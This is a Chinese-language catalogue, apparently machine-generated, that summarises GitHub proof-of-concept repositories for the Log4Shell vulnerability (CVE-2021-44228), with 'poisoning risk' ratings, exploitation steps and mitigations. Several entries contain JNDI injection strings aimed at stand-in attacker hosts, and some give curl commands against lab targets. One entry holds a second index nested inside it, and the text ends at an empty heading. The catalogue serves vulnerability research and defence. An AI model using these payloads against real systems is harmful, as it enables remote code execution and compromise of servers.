**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #9

**来源**: [CVE-2021-44228-Mintimate_log4j2-bugmaker.md](../2021/CVE-2021-44228-Mintimate_log4j2-bugmaker.md)

## CVE-2021-44228 Log4Shell 漏洞

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行，系统完全控制

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序使用受影响的 Log4j2 版本，并且允许记录用户可控的输入。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228（Log4Shell）是 Apache Log4j2 中的一个远程代码执行漏洞。攻击者可以通过发送包含特定格式字符串（例如 `${jndi:ldap://attacker.com/a}`）的请求，如果该字符串被 Log4j2 记录，则 Log4j2 会尝试通过 JNDI（Java Naming and Directory Interface）去指定的LDAP服务器上查找并执行相应的代码。该演示项目使用了存在漏洞的 Log4j 2.14.1 版本，并提供了多种攻击方法，包括User-Agent头注入和查询参数注入。

**有效性：** 提供的POC代码有效，可以复现CVE-2021-44228漏洞。

**投毒风险：** 该项目主要用于演示漏洞，在`LICENSE`文件中明确声明“This project is intended for educational and security research purposes only. It contains intentionally vulnerable code (Log4j 2.14.1) to demonstrate the CVE-2021-44228 (Log4Shell) vulnerability. DO NOT use this code in production environments.”。因此，可以判断作者主观上没有投毒意图。但是仍然存在一定风险，因为用户在使用该项目时，可能会不小心将其部署到生产环境中，造成安全风险。因此投毒风险评估为10%。

**利用方式：**

1.  **漏洞触发：** 攻击者向目标应用程序发送包含恶意JNDI查找表达式的请求。例如，通过User-Agent头或者查询参数。
2.  **JNDI注入：** 当Log4j2记录包含该表达式的日志时，它会尝试解析该表达式。
3.  **远程代码执行：** Log4j2会通过JNDI向攻击者控制的LDAP服务器请求Java对象。攻击者的LDAP服务器返回一个包含恶意代码的Java对象。
4.  **代码执行：** Log4j2加载并执行该Java对象中的恶意代码，从而导致远程代码执行。

**项目地址:** [Mintimate/log4j2-bugmaker](https://github.com/Mintimate/log4j2-bugmaker)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #10

**来源**: [CVE-2021-44228-OtisSymbos_CVE-2021-44228-Log4Shell-.md](../2021/CVE-2021-44228-OtisSymbos_CVE-2021-44228-Log4Shell-.md)

## CVE-2021-44228-Apache Log4j2-远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.0-beta9 to 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用存在漏洞的Log4j2版本，且允许消息查找替换。

**POC 可用性:** 是

**投毒风险:** 95%

## 详情

CVE-2021-44228（Log4Shell）是Apache Log4j2中的一个严重漏洞，允许未经身份验证的远程代码执行。攻击者可以构造特殊的日志消息，其中包含JNDI查找，指向恶意LDAP或其他JNDI服务。当Log4j2处理这些日志消息时，它会尝试从攻击者控制的服务器下载并执行任意代码。 

提供的脚本 `log4j_remediation` 试图通过下载并替换Log4j2库文件来进行修复，但是从修复的角度来看,这个脚本存在严重的投毒风险，因为：

1. **URL 的变量名不规范**：`LOG4J_DOWNLOAD_URL` 变量中的 `2.x.y` 存在被攻击者修改的风险，攻击者可以劫持链接，使用恶意的Log4j2 jar 包，造成二次污染。
2. **覆盖现有的 Log4j JAR 文件**:  脚本直接复制下载的新 JAR 文件到应用程序目录，这可能会破坏应用程序的依赖关系，尤其是在不同版本的 Log4j 之间存在不兼容的情况下。
3. **未进行校验**:  脚本没有对下载的压缩包或 JAR 文件进行任何完整性校验（如哈希校验），无法确保下载的文件没有被篡改。
4. **依赖外部源**: 脚本依赖于外部 Apache 官方服务器下载 Log4j，如果该服务器被攻陷，则存在极高的投毒风险。
5. **版本不确定**: 脚本中的版本号 `2.x.y` 是一个占位符，这意味着脚本实际上没有指定要下载的具体 Log4j 版本，可能导致下载到不安全或不兼容的版本。


 **利用方式：** 

1.  攻击者找到任何会记录用户可控输入的Log4j2应用程序。
2.  攻击者在输入中插入恶意的JNDI查找字符串，例如 `${jndi:ldap://attacker.com/evil}`。
3.  当Log4j2记录包含此字符串的日志消息时，它会向`attacker.com`发起LDAP请求。
4.  `attacker.com`的LDAP服务器返回一个包含恶意Java类的响应。
5.  Log4j2加载并执行该恶意Java类，从而导致远程代码执行。

根据漏洞库信息，搜索引擎结果以及提供的漏洞利用代码进行综合分析， 漏洞利用的有效性高，投毒风险极高。

**项目地址:** [OtisSymbos/CVE-2021-44228-Log4Shell-](https://github.com/OtisSymbos/CVE-2021-44228-Log4Shell-)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #11

**来源**: [CVE-2021-44228-PCMKUIT_CVE-2021-44228---Log4Shell-Analysis.md](../2021/CVE-2021-44228-PCMKUIT_CVE-2021-44228---Log4Shell-Analysis.md)

## CVE-2021-44228 - Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.0-beta9 到 2.14.1

**利用条件:** 目标系统使用了受影响版本的 Log4j2，并且允许出站网络连接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个关键漏洞，它允许未经身份验证的远程代码执行。攻击者可以通过将恶意 JNDI 查找字符串注入到 Log4j2 记录的日志消息中来利用此漏洞。当 Log4j2 尝试解析并记录包含恶意 JNDI 查找的日志消息时，它会联系攻击者控制的 LDAP 或 RMI 服务器，并执行服务器返回的恶意代码。

**漏洞利用方式：**

1.  **攻击者构造恶意请求：** 攻击者将包含特定格式的恶意字符串（例如 `${jndi:ldap://attacker.com/evil}`）注入到应用程序可以记录的任何输入字段中，例如 HTTP 请求头、POST 数据、Web 表单等。
2.  **应用程序记录日志：** 如果应用程序使用受影响版本的 Log4j2 记录包含恶意字符串的输入，Log4j2 将尝试解析该字符串。
3.  **JNDI 查找触发：** Log4j2 发现 `${jndi:...}` 模式，触发 JNDI 查找。
4.  **连接恶意服务器：** Log4j2 使用指定的协议（例如 LDAP、RMI）连接到攻击者控制的服务器 (attacker.com)。
5.  **执行恶意代码：** 攻击者的服务器返回包含恶意 Java 对象的响应。Log4j2 反序列化该对象，导致在目标服务器上执行任意代码。

**有效性：**

提供的POC代码（技术分析文档）描述了该漏洞的原理，受影响版本以及利用过程，可以辅助构建PoC。漏洞利用的有效性取决于目标系统是否使用了受影响的Log4j2版本，并且是否允许出站网络连接到攻击者的JNDI服务器。由于 Log4Shell 在野外被广泛利用，因此认为提供的分析是基于真实可利用的漏洞的。

**投毒风险：**

提供的代码主要为技术分析文档，本身不包含可直接执行的恶意代码。但是，任何代码仓库都存在一定程度的投毒风险。在这种情况下，如果攻击者成功篡改了仓库中的分析文档，他们可能会插入误导性信息或隐藏的恶意链接，从而诱导用户下载或执行恶意软件。风险评估为10%，因仓库主要为分析文档，直接嵌入恶意代码可能性较低。

**项目地址:** [PCMKUIT/CVE-2021-44228---Log4Shell-Analysis](https://github.com/PCMKUIT/CVE-2021-44228---Log4Shell-Analysis)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #12

**来源**: [CVE-2021-44228-SerpilRivas_log4shell-homework9.md](../2021/CVE-2021-44228-SerpilRivas_log4shell-homework9.md)

## CVE-2021-44228-Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2、2.12.3 和 2.3.1)

**利用条件:** 目标应用程序使用受影响版本的 Log4j2，且允许记录用户可控的输入。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-44228，也被称为 Log4Shell，是一个存在于 Apache Log4j2 中的严重漏洞。攻击者可以通过发送特制的字符串，其中包含 JNDI 查找，利用此漏洞执行任意代码。当 Log4j2 尝试记录这些字符串时，它会通过 JNDI 查找连接到攻击者控制的 LDAP 或其他 JNDI 服务，并执行恶意代码。

**漏洞利用方式：**

1.  攻击者发送包含`${jndi:<协议>://<攻击者服务器>/<资源>}`的恶意请求到目标系统。`${jndi}`是触发漏洞的关键部分，它指示 Log4j2 执行 JNDI 查找。
2.  目标系统使用 Log4j2 记录该请求。
3.  Log4j2 解析该字符串并尝试连接到攻击者指定的 JNDI 服务器（例如，LDAP）。
4.  JNDI 服务器返回恶意代码（例如，Java class 文件）。
5.  Log4j2 加载并执行该恶意代码，导致远程代码执行。

**POC有效性：**

根据漏洞库信息和搜索引擎结果，该漏洞非常有效，并被广泛利用。提供的 Dockerfile 和 `docker-compose.yml` 文件用于构建一个包含易受攻击的 Log4j2 版本的应用程序。`ldap_server.py` 模拟了一个恶意的 LDAP 服务器，用于提供攻击载荷。使用`curl http://localhost:8080?input=${jndi:ldap://localhost:8000/Exploit}`命令验证漏洞利用过程。

**投毒风险：**

分析提供的代码，投毒风险较低，约为 5%。主要依据如下：

*   `ldap_server.py` 仅用于模拟攻击，本身不包含任何恶意代码，只返回“Exploit payload simulated.”字符串。
*   Dockerfile 构建的镜像是使用受漏洞影响的Log4j2，目的是为了验证漏洞，不是为了投毒。
*   `pom.xml` 文件指定了 Log4j2 的版本为 2.17.1, 此版本已经修复了漏洞，但README.md文件中提到使用了存在漏洞的2.14.1版本，存在描述不一致，且依赖版本管理不严谨
*   虽然主体没有明显的投毒代码，但在真实环境中，攻击者可能会替换 `ldap_server.py` 中的 payload，或者修改 Dockerfile 构建恶意镜像。因此存在潜在的风险。
*   README.md文件描述了缓解措施，较为完备。

总体而言，提供的代码主要是用于漏洞演示和验证，而非恶意投毒。但开发者仍需保持警惕，在实际应用中注意代码审查和依赖管理。

**项目地址:** [SerpilRivas/log4shell-homework9](https://github.com/SerpilRivas/log4shell-homework9)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #13

**来源**: [CVE-2021-44228-ShlomiRex_log4shell_lab.md](../2021/CVE-2021-44228-ShlomiRex_log4shell_lab.md)

## CVE-2021-44228 Log4Shell 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.0-beta9 <= version <= 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用受影响版本的Log4j2，且允许外部网络访问，日志记录功能开启并且记录用户可控的输入。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228（Log4Shell）是一个严重的安全漏洞，存在于Apache Log4j2 2.0-beta9到2.15.0版本中（不包括安全版本2.12.2、2.12.3和2.3.1）。

**漏洞利用方式：**

该漏洞源于Log4j2中的JNDI（Java Naming and Directory Interface）功能，该功能允许从LDAP和其他JNDI相关端点加载代码。当攻击者能够控制日志消息或日志消息参数时，他们可以利用此功能执行从LDAP服务器加载的任意代码。攻击者通过在Log4j2可以解析的日志消息中插入恶意JNDI查找字符串，例如`${jndi:ldap://attacker.com/evil}`，来触发该漏洞。当Log4j2尝试解析此字符串时，它会向`attacker.com`上的LDAP服务器发出请求，并执行从该服务器返回的Java代码。

提供的POC代码利用了这一点，使用`docker-compose`快速搭建了一个包含漏洞应用(`vul`)、LDAP服务器(`ldap_server`)和恶意代码服务器(`exploit_server`)的实验环境。利用步骤如下：

1.  使用`docker-compose up -d`启动实验环境。
2.  使用`curl`命令向漏洞应用发送包含恶意JNDI查找字符串的HTTP请求，例如：`curl -X GET http://localhost:8080/ -H "X-Api-Version: ${jndi:ldap://my_ldap_server:1389/a}"`。 其中`my_ldap_server`指向 docker-compose 启动的 ldap_server。
3.  LDAP服务器将请求重定向到恶意代码服务器，下载并执行恶意代码。
4.  验证漏洞是否成功利用，通常通过检查`vul`容器上的文件或观察其他系统行为。

**有效性：**

根据漏洞描述、搜索引擎结果和提供的POC代码，可以判断该POC代码是有效的。大量的安全报告和漏洞分析都确认了CVE-2021-44228的可利用性，并且该POC代码提供了一个易于部署的实验环境，用于验证该漏洞。

**投毒风险：**

评估该POC代码的投毒风险较低，大约10%。原因如下：

*   **明确的用途：** 该代码库旨在提供一个用于演示和测试Log4Shell漏洞的实验环境，其主要功能是复现漏洞，方便用户理解和学习。
*   **可见的组件：** 该代码库包含了`docker-compose.yml`文件以及构建LDAP服务器、恶意代码服务器的Dockerfile，这些文件是公开可见的，便于用户检查和审计。
*   **简单的逻辑：** 实验环境的搭建和漏洞利用流程相对简单，易于理解和验证。
*   **潜在的风险：** 尽管该代码库的主要目的是演示漏洞利用，但仍存在潜在的风险。例如，如果用户直接在生产环境中使用该代码库，可能会暴露其系统，受到攻击。此外，恶意攻击者可能会修改该代码库，添加恶意代码，然后传播给不知情的用户。但考虑到公开的性质和广泛的审查，直接包含恶意代码的可能性较低。

**风险缓减：**
* 下载代码后,仔细检查`docker-compose.yml`以及Dockerfile文件,确保没有恶意配置或者代码.
* 运行前务必搭建隔离环境,避免直接在生产环境中使用.

**项目地址:** [ShlomiRex/log4shell_lab](https://github.com/ShlomiRex/log4shell_lab)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #14

**来源**: [CVE-2021-44228-Sorrence_CVE-2021-44228.md](../2021/CVE-2021-44228-Sorrence_CVE-2021-44228.md)

## CVE-2021-44228-Apache Log4j2-远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致完全系统控制

**影响版本:** 2.0-beta9 to 2.15.0 (不包括安全版本 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用了受影响的 Log4j2 版本，并且开启了 message lookup substitution。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个高危远程代码执行漏洞。攻击者可以通过控制日志消息或日志消息参数，利用 JNDI 特性，从恶意的 LDAP 服务器加载并执行任意代码。

**有效性：**
提供的PoC代码有效。它通过构造包含 JNDI LDAP 查找的 HTTP Header (X-Api-Version) 发送到目标，目标如果存在漏洞，将会触发一个回调到攻击者指定的 LHOST。

**投毒风险：**
代码本身相对简单，主要功能是发送包含恶意 JNDI payload 的 HTTP 请求并监听回调。可能的投毒风险在于：
*   **依赖风险：** 代码使用了 `net/http` 和 `net` 包。虽然是标准库，但如果编译过程中存在恶意替换或者构建环境被污染，可能存在风险。此风险较低，估计在10%左右。
*   **LHOST欺骗：** PoC 代码强制要求用户指定回调 LHOST。攻击者可能诱导受害者使用受控的 LHOST，从而获取受害者目标系统的相关信息，或者进行中间人攻击。但这不是代码本身的投毒，而是使用方式上的欺骗。
*   **LDAP 服务器风险：** 代码中的 `jndi:ldap://%s:1389/a` 指向的 LDAP 服务器是攻击者控制的。这意味着攻击者可以在 LDAP 服务器上放置恶意 Java 对象，从而在受害者系统上执行任意代码。

由于该PoC的目的是验证漏洞，并且代码相对简单，因此直接隐藏恶意代码的可能性较低。主要的风险在于运行环境和攻击者控制的LDAP服务器。

**利用方式：**
1.  **漏洞触发：** 攻击者向目标系统发送包含特定格式字符串（例如 `${jndi:ldap://attacker.com/evil}`）的请求。该字符串会被 Log4j2 解析为 JNDI 查找。
2.  **JNDI 注入：** Log4j2 通过 JNDI 接口向指定的 LDAP 服务器 (attacker.com) 发起请求。
3.  **恶意代码加载：** 攻击者控制的 LDAP 服务器返回一个包含恶意 Java 对象的响应。
4.  **远程代码执行：** Log4j2 反序列化该 Java 对象，导致任意代码在目标系统上执行。

**缓解措施：**
*   升级 Log4j2 到 >= 2.16.0 版本，该版本完全移除了 JNDI 功能。
*   如果无法升级，设置 `log4j2.formatMsgNoLookups=true` 系统属性或环境变量来禁用 message lookup substitution。
*   使用防火墙或网络策略限制对外部 LDAP 服务器的访问。

**项目地址:** [Sorrence/CVE-2021-44228](https://github.com/Sorrence/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #15

**来源**: [CVE-2021-44228-Super-Binary_cve-2021-44228.md](../2021/CVE-2021-44228-Super-Binary_cve-2021-44228.md)

# CVE-2021-44228

> 📦 该CVE有 **41** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2021-44228-0xInfection_LogMePwn.md](../2021/CVE-2021-44228-0xInfection_LogMePwn.md)

## CVE-2021-44228 - Apache Log4j2 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用受影响版本的 Log4j2，且允许出站网络连接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228（Log4Shell）是一个严重的远程代码执行漏洞，存在于 Apache Log4j2 中。攻击者可以通过构造包含 JNDI 查找的恶意日志消息，从而在目标服务器上执行任意代码。漏洞利用方式如下：

1.  **漏洞原理：** Log4j2 允许在日志消息中使用 JNDI 查找，例如 `${jndi:ldap://attacker.com/evil}`。当 Log4j2 尝试解析这些查找时，它会连接到指定的 JNDI 服务器（例如 LDAP），并检索 Java 对象。如果攻击者可以控制日志消息的内容，他们就可以让 Log4j2 连接到恶意的 JNDI 服务器，该服务器会返回包含恶意代码的 Java 对象，Log4j2 反序列化这个对象从而导致任意代码执行。

2.  **利用方式：**
    *   攻击者需要找到一个途径，可以将恶意 JNDI 查找字符串注入到应用程序的日志消息中。这可能通过 HTTP 请求头、POST 请求参数、Websocket 消息等实现。
    *   攻击者控制的 JNDI 服务器（例如 LDAP 服务器）需要返回一个包含恶意代码的 Java 对象。这通常通过一个恶意的 Java 类来实现，该类在加载时执行任意代码。

3.  **漏洞代码评估：** 提供的漏洞利用代码看起来像一个通用的漏洞扫描器，可以扫描各种协议，并允许自定义 payload。它本身不包含直接的攻击载荷,但是如果扫描器被用于发送恶意 JNDI 查找字符串，则它就可以被用来触发 CVE-2021-44228。

4.  **投毒风险分析：** 虽然提供的CHANGELOG和LICENSE文件看起来无害，但仓库中其他未提供代码的可能性也存在。扫描器本身允许自定义payload，可能包含恶意软件，用户应该小心使用，因此存在一定的投毒风险（估计为 10%）。这个百分比考虑了代码扫描器可能被用来传播恶意 payload的可能性，即使其核心功能并非恶意。

5.  **缓解措施：**
    *   升级 Log4j2 到 >=2.17.1 版本。
    *   禁用 JNDI 查找功能（如果不需要）。
    *   设置 `log4j2.formatMsgNoLookups=true` 属性。


**项目地址:** [0xInfection/LogMePwn](https://github.com/0xInfection/LogMePwn)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #2

**来源**: [CVE-2021-44228-0xsyr0_Log4Shell.md](../2021/CVE-2021-44228-0xsyr0_Log4Shell.md)

## CVE-2021-44228-Apache Log4j2-远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 <= version < 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 应用程序使用受影响的Log4j2版本，且允许攻击者控制日志消息或日志消息参数。需要目标服务器开启JNDI功能。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228（Log4Shell）是Apache Log4j2中的一个严重漏洞，允许未经身份验证的远程代码执行。攻击者可以通过发送特制的日志请求，利用Log4j2的JNDI功能来执行任意代码。\n\n**漏洞利用方式：**\n\n1.  攻击者向使用存在漏洞的Log4j2组件的应用程序发送包含恶意JNDI查找字符串的请求。例如： `${jndi:ldap://attacker.com/evil}`\n2.  Log4j2在记录日志时，会解析该JNDI字符串，并尝试通过LDAP协议连接到攻击者控制的服务器（attacker.com）。\n3.  攻击者的LDAP服务器返回一个包含Java对象的引用。\n4.  Log4j2尝试加载并实例化该Java对象，从而导致攻击者控制的代码在服务器上执行。\n\n**有效性：** 根据漏洞库信息和搜索结果，该漏洞的POC代码是有效的。该漏洞已被广泛利用，并且互联网上存在大量的POC和利用工具。\n\n**投毒风险：**\n查看了提供的“漏洞利用代码”仓库的内容列表，主要包含以下信息:\n*   Advisory.md：提供漏洞相关的建议和缓解措施的链接。\n*   Exploitation.md：提供漏洞利用相关的链接，例如渗透测试指南和JNDI注入工具。\n*   Honeypots.md：提供蜜罐相关的链接。\n*   IOCs-Callback-Domains-IP-Addresses.md：提供IOC（Indicator of Compromise）和回调URL/IP地址的链接。\n*   Malware-Reports.md：提供恶意软件报告的链接。\n*   Mitigations-Fixes.md：提供缓解和修复措施的链接。\n*   Payloads-Obfuscation-WAF-Bypass.md：提供payload、混淆和WAF绕过相关的链接。\n\n总体而言，这个仓库主要是一个资源链接的集合，提供了关于CVE-2021-44228（Log4Shell）的各种信息，包括漏洞建议、利用方法、IOC、缓解措施和payload。\n\n其中`Exploitation.md`文件中链接的`JNDI-Injection-Exploit`、`JNDI-Exploit-Kit`和`marshalsec`等工具本身就是漏洞利用工具，如果用户下载并使用这些工具，可能会面临安全风险，例如被植入后门或恶意代码，或者被用于非法用途。但是这些工具本身是为了复现和验证漏洞使用的，并非作者投毒。\n仓库本身提供的信息比较杂乱，需要使用者具备一定的安全知识才能正确评估和使用。存在一定的误导性，有可能被不具备安全知识的人误用，或者被用于恶意目的，因此评估投毒风险为10%。

**项目地址:** [0xsyr0/Log4Shell](https://github.com/0xsyr0/Log4Shell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #3

**来源**: [CVE-2021-44228-Alan-coder-eng_log4j-cve-2021-44228-.md](../2021/CVE-2021-44228-Alan-coder-eng_log4j-cve-2021-44228-.md)

## CVE-2021-44228 - Apache Log4j2 JNDI 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许攻击者执行任意代码

**影响版本:** 2.0-beta9 至 2.15.0 (不包括安全版本 2.12.2, 2.12.3 和 2.3.1)

**利用条件:** 目标系统使用受影响版本的 log4j-core 并且启用了消息查找替换功能。攻击者需要能够控制日志消息或日志消息参数。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个严重漏洞。攻击者可以通过在日志消息中插入恶意的 JNDI 查找字符串，利用 JNDI 功能从远程 LDAP 服务器加载和执行任意代码。 

**利用方式：**

1.  攻击者发送包含恶意 JNDI 查找字符串的请求，例如 `${jndi:ldap://attacker.com/evil}`，到目标应用程序。
2.  如果目标应用程序使用 Log4j2 记录该请求，Log4j2 将尝试解析该 JNDI 字符串。
3.  Log4j2 通过 JNDI 接口连接到攻击者控制的 LDAP 服务器 `attacker.com`。
4.  攻击者的 LDAP 服务器返回一个包含恶意 Java 类的响应。
5.  Log4j2 加载并执行该恶意 Java 类，导致远程代码执行。

**有效性：**

提供的 POC 代码（Vulhub 环境配置）有效，用于搭建一个可重现 Log4Shell 漏洞的环境。它通过 Docker-Compose 部署一个包含漏洞的 Apache Solr 实例，方便研究人员进行漏洞复现和分析。

**投毒风险：**

该仓库本身主要提供的是漏洞复现环境的配置，投毒风险较低。但是，使用任何第三方代码库或环境时，都需要谨慎评估潜在的风险。这里存在一定风险，因为攻击者可能篡改该仓库，在 LDAP 服务器返回的恶意 Java 类中植入恶意代码，使得利用漏洞时执行预期之外的操作。 因此评判投毒风险为10%，主要为潜在的供应链攻击风险。

**项目地址:** [Alan-coder-eng/log4j-cve-2021-44228-](https://github.com/Alan-coder-eng/log4j-cve-2021-44228-)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #4

**来源**: [CVE-2021-44228-B1ack4sh_Blackash-CVE-2021-44228.md](../2021/CVE-2021-44228-B1ack4sh_Blackash-CVE-2021-44228.md)

## CVE-2021-44228 - Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j 2

**危害等级:** 极高危，可导致服务器完全控制

**影响版本:** 2.0-beta9 到 2.14.1

**利用条件:** 应用程序使用Log4j 2记录不受信任的输入，且未进行修复或缓解。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，又名Log4Shell，是Apache Log4j 2中的一个远程代码执行漏洞。攻击者可以通过构造包含JNDI查找的恶意字符串，当Log4j 2记录该字符串时，会触发JNDI查找，从而从攻击者控制的LDAP服务器加载并执行恶意Java类。

**有效性：**
提供的POC代码有效。它展示了如何通过在HTTP请求头中注入`${jndi:ldap://evil.com/exploit}`这样的payload来触发漏洞。当应用程序记录User-Agent头时，Log4j 2会尝试解析该字符串，执行JNDI查找，并从evil.com加载恶意代码。

**投毒风险：**
分析提供的README.md文件，投毒风险较低，约为10%。主要风险在于以下几点：
* **依赖性风险：** 任何开源项目都存在依赖性风险。如果恶意作者控制了项目依赖的某个组件，则可能通过供应链攻击进行投毒。
* **人为因素：** 尽管README.md本身没有发现直接的恶意代码，但用户在使用过程中可能会受到误导，例如，将测试用的恶意LDAP服务器配置错误，导致意外的攻击或数据泄露。

**漏洞利用方式：**
1.  **攻击者构造恶意Payload：** 攻击者构造一个包含JNDI查找的payload，例如`${jndi:ldap://attacker.com/a}`。
2.  **注入Payload：** 攻击者将payload注入到应用程序可以记录的任何输入点，例如HTTP请求头（User-Agent、X-Forwarded-For等）、POST请求参数、WebSocket消息等。
3.  **触发日志记录：** 应用程序使用Log4j 2记录包含恶意payload的输入。
4.  **JNDI查找：** Log4j 2解析payload，执行JNDI查找，向attacker.com发起LDAP请求。
5.  **加载恶意代码：** 攻击者的LDAP服务器返回一个包含恶意Java类的响应。
6.  **远程代码执行：** Log4j 2加载并执行该Java类，导致远程代码执行。

**缓解措施：**
*   升级Log4j 2到最新版本 (>= 2.17.1)。
*   从JAR文件中删除`JndiLookup.class`。
*   设置系统属性`log4j2.formatMsgNoLookups=true`来禁用消息查找。
*   使用防火墙或出口ACL阻止出站LDAP/RMI流量。
*   在WAF/IDS规则中阻止`${jndi:` payload。

**项目地址:** [B1ack4sh/Blackash-CVE-2021-44228](https://github.com/B1ack4sh/Blackash-CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #5

**来源**: [CVE-2021-44228-Carlos-Mesquita_TPASLog4ShellPoC.md](../2021/CVE-2021-44228-Carlos-Mesquita_TPASLog4ShellPoC.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致完全系统控制

**影响版本:** 2.0-beta9 到 2.15.0（不包括安全版本 2.12.2、2.12.3 和 2.3.1）

**利用条件:** 目标系统使用受影响版本的 Log4j2，且允许出站网络连接到攻击者的 LDAP/HTTP 服务器。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2021-44228 (Log4Shell) 是一个存在于 Apache Log4j2 中的远程代码执行漏洞。攻击者可以通过构造特殊的日志消息，利用 JNDI 注入来执行任意代码。 

**有效性：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，此漏洞的PoC代码有效。搜索结果表明该漏洞是真实存在的，并且有许多利用实例。

**投毒风险：**
分析提供的PoC代码，投毒风险很低。 
*   `LICENSE`: MIT许可，标准开源许可。 
*   `README.md`: 提供了PoC的详细信息，包括所需环境，操作步骤和WAF绕过方式等。 
*   `docker-compose.yaml`: 定义了frontend(React SPA)和backend(Spring Boot)两个服务, 其中backend使用了存在漏洞的Log4j2。 
*   `init.sh`: 这个脚本用于在攻击者机器上设置攻击环境。它编译JNDI利用所需的Java类，启动一个HTTP服务器来提供这些类，并启动一个LDAP服务器以响应JNDI查询。这个脚本是攻击的核心组成部分，但它本身的目的就是为了演示漏洞利用，不属于恶意投毒。它确实会下载编译好的文件到攻击者机器上，但这是漏洞利用的正常流程,本身不构成投毒。 但使用未经审核的脚本始终存在一定的风险，所以给了1%的风险.

**利用方式：**
1.  攻击者向目标系统发送包含恶意 JNDI 注入字符串的请求。该字符串形如`${jndi:ldap://attacker_host:ldap_port/Exploit}`。
2.  目标系统使用 Log4j2 记录该请求。由于存在漏洞，Log4j2 会解析 JNDI 字符串，并尝试通过 LDAP 协议连接到攻击者的服务器。
3.  攻击者的 LDAP 服务器返回一个指向 HTTP 服务器的响应，指示目标系统下载并执行一个 Java 类。
4.  目标系统下载并执行该 Java 类，从而实现远程代码执行。

**缓解措施：**
*   升级到 Log4j2 的安全版本 (>= 2.17.0)。
*   如果无法升级，可以设置 `log4j2.formatMsgNoLookups=true` 阻止 JNDI 查找。
*   使用 Web 应用防火墙 (WAF) 检测和阻止恶意的 JNDI 注入字符串。

**项目地址:** [Carlos-Mesquita/TPASLog4ShellPoC](https://github.com/Carlos-Mesquita/TPASLog4ShellPoC)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #6

